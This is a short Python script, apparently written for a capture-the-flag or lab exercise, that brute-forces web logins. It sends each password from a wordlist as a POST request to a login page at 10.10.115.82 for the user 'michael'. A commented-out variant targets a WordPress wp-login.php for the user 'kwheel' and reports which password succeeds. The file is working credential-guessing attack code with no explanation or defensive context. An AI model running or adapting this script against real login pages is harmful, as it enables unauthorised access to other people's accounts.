import sys, requests, time

url = "http://10.10.115.82/login"
wordlist = "test.txt"
wl_len = len(open(wordlist, "r").readlines())
lines = []

with open(wordlist, "r", errors='replace', encoding='UTF-8') as w:
	for x in range(wl_len):
		lines.append(w.readline().strip('\n'))

for line in lines:
	data = {
	"username": "michael",
	"password": line
	}
	r = requests.post(url, data)
	print(r.content)

















# import sys,requests,time
#
#
# url = "http://10.10.14.90/wp-login.php"
# file_path = "test.txt"
# file_len = len(open(file_path, "r").readlines())
# lines = []
#
#
# with open(file_path, "r", errors='replace', encoding='UTF-8') as f:
# 	for x in range(file_len):
# 		lines.append(f.readline().strip('\n'))
#
#
# for line in lines:
#     data = {
#     "log":"kwheel",
#     "pwd": line
#     }
#
#     request = requests.post(url, data)
#     print(request)
#
#     try:
#         request = requests.post(url, data)
#         if request.status_code == 200:
#             print("Fail: " + line)
#         else:
#             print("Success: " + line)
#             sys.exit()
#     except:
#         time.sleep(5)



#try:
#    init_help = sys.argv[1]
#    if init_help == "-h" or init_help == "--help" or len(sys.argv) < 6:
#        print("Usage:")
#        print("-U")
#        print("-P")
#        sys.exit()
#    else:
#        print("done")
#        exit()
        #execute(sys.argv)
#except IndexError:
#    raise SystemExit("-h or --help for usage")
